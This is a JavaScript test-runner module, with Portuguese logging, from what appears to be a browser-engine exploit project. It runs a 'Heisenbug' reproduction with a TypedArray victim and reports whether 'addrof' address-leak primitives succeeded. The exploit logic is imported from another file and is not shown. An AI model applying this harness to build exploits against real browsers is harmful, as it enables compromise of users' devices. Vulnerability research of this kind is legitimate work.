// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_FocusDirectABLeak, // ATUALIZADO para v53
    FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL // ATUALIZADO para v53
} from './testArrayBufferVictimCrash.mjs'; // Arquivo principal do teste

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    // ATUALIZADO para refletir v53
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_FocusDirectABLeak";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (FocusDirectABLeak) ====`, 'test', FNAME_RUNNER);

    // ATUALIZADO para chamar a função v53
    const result = await executeTypedArrayVictimAddrofTest_FocusDirectABLeak();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        // ATUALIZADO para refletir v53 no título do documento
        document.title = `Heisenbug (TypedArray-FDAL) ERR: ${result.errorCapturedMain.name}`;
        if (result.errorCapturedMain.name === 'TypeError' && result.errorCapturedMain.message.includes("circular structure")) {
            logS3(`    NOTA: TypeError de estrutura circular. Isso pode indicar controle sobre a serialização.`, "good", FNAME_RUNNER);
        }
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "good", FNAME_RUNNER);

        let heisenbugConfirmedPayloadAssignment = false;
        const relevantCallPayload = result.all_probe_calls_for_analysis.find(d => d.this_type === '[object Object]' && d.payload_A_assigned);
        if (relevantCallPayload) {
            heisenbugConfirmedPayloadAssignment = true;
            logS3(`  !!!! HEISENBUG & PAYLOAD ASSIGNMENT (em Object) CONFIRMADAS NA CHAMADA #${relevantCallPayload.call_number} !!!! Tipo: ${relevantCallPayload.this_type}`, "critical", FNAME_RUNNER);
        }

        let heisenbugConfirmedDirectABLeak = false;
        const relevantCallDirectLeak = result.all_probe_calls_for_analysis.find(d => d.addrof_result_from_this !== null && d.probe_variant.includes("FocusDirectABLeak"));
        if (relevantCallDirectLeak && result.addrof_A_result.success) { // Considerar sucesso se addrof_A teve sucesso por este meio
             heisenbugConfirmedDirectABLeak = true;
             logS3(`  !!!! V53 TARGET: LEAK DIRETO DE ARRAYBUFFER/TYPEDARRAY ( sonda Caso 3 ) bem sucedido! Chamada #${relevantCallDirectLeak.call_number} !!!!`, "critical", FNAME_RUNNER);
        }


        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (anyAddrofSuccess) {
            logS3(`    ADDROF A: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
            logS3(`    ADDROF B: ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`    ADDROF A FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
            logS3(`    ADDROF B FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
        }


        let lastCallProbeDetails = null;
        if(result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0){
            lastCallProbeDetails = result.all_probe_calls_for_analysis[result.all_probe_calls_for_analysis.length-1];
        }
        if (lastCallProbeDetails && lastCallProbeDetails.error_in_probe) {
            logS3(`    ERRO INTERNO NA ÚLTIMA SONDA REGISTRADA: ${lastCallProbeDetails.error_in_probe}`, "warn", FNAME_RUNNER);
        }

        // ATUALIZADO para refletir v53 no título do documento
        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: Addr SUCCESS!`;
        } else if (heisenbugConfirmedPayloadAssignment || (result.stringifyResult && result.stringifyResult.parse_error && result.stringifyResult.error_parsing_stringify_output.includes("circular structure"))) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: Heisenbug OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}: No Heisenbug?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (FocusDirectABLeak) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    // ATUALIZADO para refletir v53
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`, 'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (FocusDirectABLeak) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // ATUALIZADO para refletir v53 no título do documento
    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("Heisenbug OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_FDAL} Concluído`;
        }
    }
}
